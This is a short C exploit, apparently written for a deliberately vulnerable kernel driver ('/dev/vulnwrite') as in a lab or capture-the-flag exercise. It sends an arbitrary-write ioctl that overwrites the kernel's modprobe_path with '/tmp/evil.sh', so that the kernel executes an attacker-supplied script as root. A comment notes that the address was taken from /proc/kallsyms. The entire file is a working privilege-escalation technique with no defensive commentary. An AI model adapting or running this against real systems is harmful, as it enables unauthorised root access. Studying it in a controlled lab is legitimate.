#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>

struct vuln_write_req {
	unsigned long addr;
	char data[256];
};

#define VULN_WRITE _IOW('v', 1, struct vuln_write_req)

/* Found via: cat /proc/kallsyms | grep modprobe_path */
#define MODPROBE_PATH_ADDR 0xffffffff8284f5e0UL

int main(void)
{
	int fd;
	const char *payload = "/tmp/evil.sh";
	struct vuln_write_req req = { .addr = MODPROBE_PATH_ADDR };

	strncpy(req.data, payload, sizeof(req.data) - 1);

	fd = open("/dev/vulnwrite", O_RDWR);
	if (fd < 0) {
		perror("open /dev/vulnwrite");
		return 1;
	}

	if (ioctl(fd, VULN_WRITE, &req) < 0) {
		perror("ioctl");
		return 1;
	}

	printf("wrote \"%s\" to modprobe_path\n", payload);
	close(fd);
	return 0;
}
